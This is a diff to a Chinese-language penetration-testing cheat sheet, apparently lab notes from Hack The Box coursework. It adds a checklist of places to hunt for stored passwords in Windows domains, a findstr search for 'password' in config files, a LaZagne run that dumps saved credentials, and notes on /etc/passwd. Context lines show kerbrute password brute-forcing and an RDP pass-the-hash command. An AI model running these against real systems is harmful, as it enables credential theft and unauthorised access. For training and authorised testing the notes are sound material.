@@ -287,9 +287,28 @@ netexec smb STMIP                                              获取目标的 s
 ./kerbrute bruteuser -d ILF.local --dc STMIP /usr/share/wordlists/fasttrack.txt jmarston      爆破用户 jmarston
 
 
+以下是进行凭据搜寻时应牢记一些地方：
+
+SYSVOL 共享中组策略里的密码
+SYSVOL 共享中脚本里的密码
+IT 共享中脚本里的密码
+开发机器和 IT 共享上 web.config 文件中的密码
+unattend.xml 中的密码
+AD 用户或计算机描述字段中的密码
+KeePass 数据库（如果我们能够猜测或破解主密码）
+在用户系统和共享上找到
+在用户系统、共享和 Sharepoint 上找到的名为 pass.txt、passwords.docx、passwords.xlsx 的文件
+
+用 GUI  搜索 'password'
+用 CMD  C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml      可以将 "password" 换成 "gitlab" 找 gitlab 的密码
+在目标本地运行 start PS:> LaZagne.exe all
 
 
+Linux:::
+etc/passwd 内容
+htb-student:x:1000:1000:,,,:/home/htb-student:/bin/bash            用户名:密码:用户ID:组ID:GECOS:主目录:默认shell      如找到密码 x，表示密码以哈希形式存储在 /etc/shadow 文件中
 
+root::0:0:root:/root:/bin/bash            代表可以 su 到 root
 
 
 
@@ -312,13 +331,6 @@ netexec smb STMIP                                              获取目标的 s
   xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
 
   https://specterops.io/blog/2017/03/16/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/#
-
-Hunt pwd:
-  https://github.com/AlessandroZ/LaZagne
-    python3 laZagne.py all
-  
-  https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/findstr
-    C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
 
   https://github.com/unode/firefox_decrypt
    python3 laZagne.py browsers
